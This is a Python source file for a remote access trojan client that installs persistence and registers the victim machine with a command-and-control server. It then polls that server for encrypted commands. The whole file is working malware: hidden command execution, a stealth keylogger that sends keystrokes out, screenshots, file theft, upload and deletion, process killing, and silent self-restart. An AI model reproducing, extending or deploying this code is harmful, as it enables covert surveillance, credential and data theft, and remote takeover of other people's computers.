import requests
import time
import platform
import socket
import sys
import traceback
from client_identity_manager import ClientIdentityManager
from config import HOST, ENCRYPTION_KEY
from encryptor import Encryptor
from persistence import PersistenceManager
from protocol import Protocol
from process_manager import ProcessManager
from file_manager import FileManager
from keylogger import Keylogger
from screenshotManager import take_screenshot, ScreenshotManager
from System_info import SystemInfo
from logger import logger



class RATClient:
    def __init__(self):
        self.id_manager = ClientIdentityManager()
        self.persistence = PersistenceManager()
        self.process_manager = ProcessManager()
        self.file_manager = FileManager()

        self.client_id = self.id_manager._get_persistent_client_id()
        self.server_url = HOST
        self.registered = False
        self.encryptor = Encryptor(ENCRYPTION_KEY)
        
        # Keylogger support
        self.keylogger = Keylogger(self.encryptor, self.client_id, self.server_url)
        self.keylogger_enabled = False
        
        # Screenshot support
        self.screenshot_manager = ScreenshotManager()
        
        # System info support
        try:
            self.system_info = SystemInfo()
        except Exception as e:
            logger.error(f"Failed to initialize SystemInfo: {e}")
            # Create a dummy system info
            class DummySystemInfo:
                def get_all_system_info(self):
                    return {"error": "SystemInfo initialization failed"}
            self.system_info = DummySystemInfo()

    
    def get_system_info(self):
        try:
            return self.system_info.get_all_system_info()
        except Exception as e:
            # Fallback to basic info
            hostname = socket.gethostname()
            return {
                "platform": self.persistence.platform,
                "platform_version": platform.version(),
                "hostname": hostname,
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "username": platform.node(),
                "persistence info": self.persistence.check_persistence(),
                "python_version": platform.python_version()
            }
    
    
    def register(self):
        try:
            system_info = self.get_system_info()
            
            registration_msg = Protocol.create_register_message(
                client_id=self.client_id,
                system_info=system_info
            )

            encrypted_data = self.encryptor.encrypt(registration_msg)
            if not encrypted_data:
                logger.error("Failed to encrypt registration message")
                return False
            
            logger.info(f"Attempting to register with C2 server: {self.server_url}")
            
            response = requests.post(
                f"{self.server_url}/register",
                json={"data": encrypted_data},
                headers={'Content-Type': 'application/json'},
                timeout=10
            )

            if response.status_code == 200:
                response_data = response.json()
                decrypted_response = self.encryptor.decrypt(response_data.get('data'))

                if decrypted_response and decrypted_response.get('type') == 'success':
                    self.registered = True
                    logger.info("Successfully registered with C2 server")
                    return True
            
            logger.warning(f"Registration failed with status: {response.status_code}")
            return False
                

        except requests.exceptions.ConnectionError as e:
            logger.error(f"Cannot connect to C2 server at {self.server_url}: {e}")
            return False

        except Exception as e:
            logger.error(f"Registration error: {e}")
            logger.debug(traceback.format_exc())
            return False
    
    
    def send_heartbeat(self):
        try:
            heartbeat_msg = Protocol.create_heartbeat_message(
                self.client_id,
                extra_data={"persistence_activity": self.persistence.check_persistence()}
            )

            encrypted_data = self.encryptor.encrypt(heartbeat_msg)
            
            if not encrypted_data:
                return False

            response = requests.post(
                f"{self.server_url}/heartbeat",
                json={"data": encrypted_data},
                timeout=5
            )
            
            if response.status_code == 200:
                response_data = response.json()
                decrypted_res = self.encryptor.decrypt(response_data.get('data'))
                return decrypted_res and decrypted_res.get("type") == 'success'
            
            return False
            
        except Exception as e:
            return False


    def handle_process_command(self, command_data):
        try:
            action = command_data.get('action')
            data = command_data.get('data', {})
            
            # Process management
            if action == "get_all_processes":
                result = self.process_manager.get_all_processes(detailed=True)
            elif action == "get_process_tree":
                result = self.process_manager.get_process_tree()
            elif action == "get_process_details":
                result = self.process_manager.get_process_details(data.get('pid'))
            elif action == "kill_process":
                result = self.process_manager.kill_process(data.get('pid'))
            elif action == "start_process":
                result = self.process_manager.start_process(
                    data.get('command'), 
                    data.get('hidden', False)
                )
            elif action == "execute_command":
                result = self.process_manager.execute_command(
                    data.get('command'),
                    data.get('hidden', False),
                    data.get('working_dir')
                )
            elif action == "get_system_info":
                result = self.process_manager.get_system_info()
            
            # Keylogger commands
            elif action == "start_keylogger":
                result = self.keylogger.start(stealth=data.get('stealth', True))
                if result.get("success"):
                    self.keylogger_enabled = True
            elif action == "stop_keylogger":
                result = self.keylogger.stop()
                if result.get("success"):
                    self.keylogger_enabled = False
            elif action == "get_keylogger_status":
                result = self.keylogger.get_status()
            elif action == "get_keylog_data":
                if self.keylogger.log_buffer:
                    self.keylogger.send_logs_sync(self.keylogger.log_buffer.copy())
                    self.keylogger.log_buffer.clear()
                result = {"message": "Keylog data sent to server"}
            
            # Screenshot commands
            elif action == "take_screenshot":
                quality = data.get('quality', 65)
                multi_display = data.get('multi_display', False)
                result = take_screenshot(quality=quality, multi_display=multi_display)
            elif action == "screenshot_config":
                quality = data.get('quality')
                max_width = data.get('max_width')
                result = self.screenshot_manager.update_config(quality, max_width)
            
            # System info commands
            elif action == "get_detailed_system_info":
                result = self.system_info.get_all_system_info()
            elif action == "get_os_info":
                result = self.system_info.get_Os_informations()
            elif action == "get_network_info":
                result = {"network": self.system_info.network_info}
            elif action == "get_user_info":
                result = {"user": self.system_info.detailed_user_data}
            elif action == "get_privileges_info":
                result = {"privileges": self.system_info.get_privileges}
            elif action == "get_architecture_info":
                result = {"architecture": self.system_info.get_architecture}
            
            else:
                result = {"error": f"Unknown process action: {action}"}
            
            return result
        except Exception as e:
            return {"error": f"Process command failed: {e}"}
    
    
    def handle_file_command(self, command_data):
        try:
            action = command_data.get("action")
            data = command_data.get("data", {})
            
            if action.startswith("file_"):
                action = action[5:]
                
            if action == "list_directory":
                path = data.get("path", '.')
                result = self.file_manager.list_directory(path)
            elif action == "download_chunk":
                result = self.file_manager.download_file_chunk(
                    data.get("file_path"),
                    data.get("chunk_index", 0)
                )
            elif action == "upload_chunk":
                result = self.file_manager.upload_file_chunk(
                    data.get("file_path"),
                    data.get('chunk_data'),
                    data.get('chunk_index', 0),
                    data.get('is_last', False)
                )
            elif action == "search_files":
                result = self.file_manager.search_files(
                    data.get("root_path", "."),
                    data.get("pattern", "*"),
                    data.get("max_results", 50)
                )
            elif action == "compress_files":
                result = self.file_manager.compress_files(
                    data.get("files", []),
                    data.get("output_path")
                )
            elif action == "delete_file":
                result = self.file_manager.delete_file(data.get('file_path'))
            elif action == "create_directory":
                result = self.file_manager.create_directory(data.get('dir_path'))
            else:
                result = {"error": f"Unknown file action: {action}"}

            return result
        
        except Exception as e:
            return {"error": f"file command failed: {e}"}
    
    
    def poll_commands(self):
        try: 
            get_commands_msg = Protocol.create_get_commands_message(self.client_id)
            encrypted_data = self.encryptor.encrypt(get_commands_msg)
            
            if not encrypted_data:
                logger.error("Failed to encrypt command poll message")
                return
            
            logger.debug(f"Polling for commands from {self.server_url}/commands")
            response = requests.post(
                f'{self.server_url}/commands',
                json={"data": encrypted_data},
                timeout=30
            )
            logger.debug(f"Command poll response: {response.status_code}")
            
            if response.status_code == 200:
                response_data = response.json()
                decrypted_response = self.encryptor.decrypt(response_data.get('data'))

                logger.debug(f"Client polling for commands. Response status: {response.status_code}")
                if decrypted_response and decrypted_response.get("type") == "commands":
                    commands = decrypted_response.get("commands", [])
                    for command in commands:
                        logger.info(f"Executing command: {command.get('action')}")
                        self.execute_command(command)
                else:
                    logger.debug(f"No commands or invalid response")
            else:
                logger.warning(f"Command poll failed: {response.status_code}")
        
        except Exception as e:
            logger.error(f"Error polling commands: {e}")
            logger.debug(traceback.format_exc())
 
    
    def execute_command(self, command):
        try:
            command_id = command.get('command_id')
            action = command.get("action")
            data = command.get("data", {})
            
            logger.info(f"Executing command {command_id}: {action}")
            
            # Route to appropriate handler
            if action.startswith("file_"):
                result = self.handle_file_command({
                    "action": action,
                    "data": data
                })
            else:
                result = self.handle_process_command({
                    "action": action,
                    "data": data
                })
            
            logger.debug(f"Command {command_id} result: {type(result)}, size: {len(str(result)) if result else 0}")
            
            # Send result back
            result_msg = Protocol.create_command_result_message(self.client_id, command_id, result)
            
            encrypted_result = self.encryptor.encrypt(result_msg)
            if encrypted_result:
                logger.debug(f"Submitting result for command {command_id}")
                response = requests.post(
                    f"{self.server_url}/commands_result",
                    json={"data": encrypted_result},
                    timeout=10
                )
                logger.debug(f"Result submission response: {response.status_code}")
                if response.status_code != 200:
                    logger.error(f"Result submission failed: {response.text}")
            else:
                logger.error(f"Failed to encrypt result")
        
        except Exception as e:
            logger.error(f"Command execution error: {e}")
            logger.debug(traceback.format_exc())


    def start(self):
        try:
            logger.info(f"Starting RAT client - C2 Server: {self.server_url}")
            logger.info(f"Client ID: {self.client_id}")

            # Install persistence
            try:
                if self.persistence.platform in ["Windows", "Linux"]:
                    self.persistence.install_persistence()
                    logger.info("Persistence installed successfully")
                else:
                    logger.warning(f"Persistence not supported on {self.persistence.platform}")
            except Exception as e:
                logger.error(f"Failed to install persistence: {e}")
            
            # Initial registration with retries
            retry_count = 0
            max_retries = 10
            while retry_count < max_retries:
                if self.register():
                    logger.info("Successfully registered with server")
                    break
                retry_count += 1
                logger.warning(f"Registration failed, retry {retry_count}/{max_retries} in 30 seconds...")
                time.sleep(30)
            
            if retry_count >= max_retries:
                logger.error("Max registration retries reached, continuing anyway...")
            
            # Main loop
            heartbeat_count = 0
            command_poll_count = 0
            
            logger.info("Entering main loop")
            
            while True:
                try:
                    if heartbeat_count % 6 == 0:  # Every 60 seconds
                        logger.info(f"Heartbeat #{heartbeat_count} - Client active")
                    
                    if not self.send_heartbeat():
                        logger.warning("Heartbeat failed, attempting re-registration...")
                        self.registered = False
                        self.register()
                    
                    if command_poll_count % 3 == 0:
                        self.poll_commands()
                        
                    heartbeat_count += 1
                    command_poll_count += 1
                    time.sleep(10)  # Check every 10 seconds
                    
                except KeyboardInterrupt:
                    logger.info("Client stopped by user")
                    break
                except Exception as e:
                    logger.error(f"Error in main loop: {e}")
                    logger.debug(traceback.format_exc())
                    time.sleep(30)
        
        except Exception as e:
            logger.critical(f"Fatal error in start(): {e}")
            logger.debug(traceback.format_exc())
            # Continue anyway - silent failure
            time.sleep(60)
            self.start()  # Restart



if __name__ == "__main__":
    try:
        logger.info("=" * 50)
        logger.info("RAT Client Starting")
        logger.info("=" * 50)
        client = RATClient()
        client.start()
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
        logger.debug(traceback.format_exc())
        # Silent failure - restart after delay
        time.sleep(60)
        try:
            client = RATClient()
            client.start()
        except:
            pass  # Ultimate silent failure
